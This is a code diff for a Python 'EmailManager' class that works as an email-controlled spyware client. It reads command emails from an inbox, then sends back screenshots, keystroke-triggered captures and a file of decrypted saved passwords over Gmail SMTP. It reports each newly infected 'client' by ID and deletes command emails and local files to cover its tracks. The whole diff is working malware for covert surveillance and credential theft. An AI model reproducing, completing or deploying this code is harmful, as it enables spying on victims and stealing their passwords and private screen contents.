@@ -15,11 +15,10 @@ import cdump
 
 class EmailManager:
 
-    def __init__(self, email, password, id, rate=5):
+    def __init__(self, email, password, id):
         self.email = email
         self.password = password
         self.id = id
-        self.rate = rate
         self.keys = []
 
     def scheduled_check(self):
@@ -37,91 +36,126 @@ class EmailManager:
             message = email.message_from_bytes(data[0][1])
 
             if message.get('Subject') == "give" + " " + self.id:
-                self.give_command_received(imap_server, msg_num)
+                self.give_command_response(imap_server, msg_num)
             elif message.get('Subject') == "screenshot" + " " + self.id:
-                self.screenshot_command_received(imap_server, msg_num)
+                self.screenshot_command_response(imap_server, msg_num)
             elif message.get('Subject') == "dump" + " " + self.id:
                 print("dump command")
-                self.new_email(self.email, self.id + "'s cached info", "dump", "\n[*] Date: " + str(datetime.datetime.now()))
-                print("email sent")
-                imap_server.store(msg_num, "+FLAGS", "\\Deleted")
-                print("email prompt removed")
-                os.remove("decrypted_password.csv")
+                self.dump_command_response(imap_server, msg_num)
 
         imap_server.expunge()
         imap_server.close()
 
     # keys and screenshots from when certain important keys are pressed, like @
-    def give_command_received(self, imap_server, msg_num):
+    def give_command_response(self, imap_server, msg_num):
         print("give command")
-        self.new_email(self.email, self.id + "'s keys", "give", "[*] Inputs: " + str(self.keys) + "\n[*] Date: " + str(datetime.datetime.now()))
+        msg = EmailMessage()
+        msg['to'] = self.email
+        msg['subject'] = self.id + "'s picture"
+        msg['from'] = self.email
+        try:
+            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+        except Exception as e:
+            print(f"ERROR: {e}")
+
+        try:
+            msg.make_mixed()
+            for i in range(len(os.listdir("logs"))):
+                image = open(f"logs/det{str(i + 1)}.jpg", 'rb')
+                att = MIMEImage(image.read())
+                att.add_header('Content-Disposition', 'attachment', filename=str(image))
+                msg.attach(att)
+        except Exception as e:
+            print(f"ERROR: {e}")
+        self.send_email(msg)
         print("email sent")
+
         imap_server.store(msg_num, "+FLAGS", "\\Deleted")
         print("email prompt removed")
         for i in range(len(os.listdir("logs"))):
             os.remove(f"logs/det{i + 1}.jpg")
 
-    def screenshot_command_received(self, imap_server, msg_num):
+    def screenshot_command_response(self, imap_server, msg_num):
         print("screenshot command")
-        self.new_email(self.email, self.id + "'s picture", "screenshot", "[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+        shot = pyautogui.screenshot()
+        print("saved")
+        shot.save(f"ss/sc.jpg")
+
+        msg = EmailMessage()
+        msg['to'] = self.email
+        msg['subject'] = self.id + "'s picture"
+        msg['from'] = self.email
+        try:
+            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+        except Exception as e:
+            print(f"ERROR: {e}")
+
+        msg.make_mixed()
+        image = open(f"ss/sc.jpg", 'rb')
+        att = MIMEImage(image.read())
+        att.add_header('Content-Disposition', 'attachment', filename=str(image))
+        msg.attach(att)
+        self.send_email(msg)
         print("email sent")
+
         imap_server.store(msg_num, "+FLAGS", "\\Deleted")
         print("email prompt removed")
         for i in range(len(os.listdir("ss"))):
             os.remove(f"ss/sc.jpg")
 
-    def dump_command_received(self, imap_server, msg_num):
+    def dump_command_response(self, imap_server, msg_num):
         print("dump command")
-        self.new_email(self.email, self.id + "'s cached info", "dump", "\n[*] Date: " + str(datetime.datetime.now()))
+        msg = EmailMessage()
+        msg['to'] = self.email
+        msg['subject'] = self.id + "'s cached info"
+        msg['from'] = self.email
+        try:
+            msg.set_content("\n[*] Date: " + str(datetime.datetime.now()))
+        except Exception as e:
+            print(f"ERROR: {e}")
+
+        try:
+            msg.make_mixed()
+            cdump.run()
+            with open(f"decrypted_password.csv", 'rb') as file:
+                msg.attach(MIMEApplication(file.read(), Name="decrypted"))
+        except Exception as e:
+            print(f"ERROR: {e}")
+        self.send_email(msg)
         print("email sent")
+
         imap_server.store(msg_num, "+FLAGS", "\\Deleted")
         print("email prompt removed")
         os.remove("decrypted_password.csv")
 
-    def new_email(self, to, subject, command, body=None):
+    def send_setup(self, first_time):
+        shot = pyautogui.screenshot()
+        print("saved")
+        shot.save(f"ss/sc.jpg")
+
         msg = EmailMessage()
-        msg['to'] = to
-        msg['subject'] = subject
-        try:
-            msg.set_content(body)
-        except:
-            ...
-
+        msg['to'] = self.email
+        msg['subject'] = "New client created | ID: " + self.id if first_time else "Old client started | ID: " + self.id
         msg['from'] = self.email
+        try:
+            msg.set_content("\n[*] Date: " + str(datetime.datetime.now()))
+        except Exception as e:
+            print(f"ERROR: {e}")
 
-        if command == "give":
-            try:
-                msg.make_mixed()  # This converts the message to multipart/mixed
-                for i in range(len(os.listdir("logs"))):
-                    image = open(f"logs/det{str(i + 1)}.jpg", 'rb')
-                    att = MIMEImage(image.read())
-                    att.add_header('Content-Disposition', 'attachment', filename=str(image))
-                    msg.attach(att)  # Don't forget to convert the message to multipart first!
-            except:
-                ...
-        elif command == "screenshot":
+        try:
+            msg.set_content("[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+        except Exception as e:
+            print(f"ERROR: {e}")
+        msg.make_mixed()
+        image = open(f"ss/sc.jpg", 'rb')
+        att = MIMEImage(image.read())
+        att.add_header('Content-Disposition', 'attachment', filename=str(image))
+        msg.attach(att)
+        self.send_email(msg)
+        print("setup email sent")
 
-            shot = pyautogui.screenshot()
-            print("saved")
-            shot.save(f"ss/sc.jpg")
-
-            msg.make_mixed()  # This converts the message to multipart/mixed
-            image = open(f"ss/sc.jpg", 'rb')
-            att = MIMEImage(image.read())
-            att.add_header('Content-Disposition', 'attachment', filename=str(image))
-            msg.attach(att)  # Don't forget to convert the message to multipart first![
-
-        elif command == "dump":
-            msg.make_mixed()  # This converts the message to multipart/mixed
-            cdump.run()
-            # open and read the CSV file in binary
-            with open(f"decrypted_password.csv", 'rb') as file:
-                # Attach the file with filename to the email
-                msg.attach(MIMEApplication(file.read(), Name="decrypted"))
-
-
+    def send_email(self, msg):
         smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
-
         smtp_server.starttls()
         smtp_server.login(self.email, self.password)
         smtp_server.send_message(msg)
